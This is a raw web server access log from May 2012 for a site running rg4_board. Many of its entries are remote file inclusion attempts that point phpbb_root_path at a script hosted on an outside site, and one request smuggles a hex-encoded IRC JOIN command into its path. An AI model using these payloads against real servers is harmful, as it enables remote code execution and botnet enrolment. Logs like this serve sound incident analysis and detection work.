127.0.0.1 - - [03/May/2012:00:52:35 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:53:17 +0900] "HEAD /admin/spaw/spacer.gif HTTP/1.0" 404 -
61.247.204.36 - - [03/May/2012:00:53:30 +0900] "GET /rg4_board/down.php?bbs_code=open_4&bd_num=3135&key=0&mode=down HTTP/1.1" 200 120832
124.2.44.105 - - [03/May/2012:00:53:54 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3741&month=6&year=2012 HTTP/1.0" 200 47103
127.0.0.1 - - [03/May/2012:00:54:40 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:54:44 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:54:44 +0900] "GET /rg4_board/slide.php?bbs_code=action HTTP/1.0" 404 311
127.0.0.1 - - [03/May/2012:00:54:46 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:54:51 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:54:53 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:54:54 +0900] "GET / HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:55:34 +0900] "GET %4a%4f%49%4e%20%23%43%70%70%20%6b%6d%0d%0a/rg4_board/mail_content.php?bbs_code=open_7&bd_num=3674 HTTP/1.0" 404 318
127.0.0.1 - - [03/May/2012:00:55:39 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:55:40 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:55:44 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:55:59 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:56:01 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
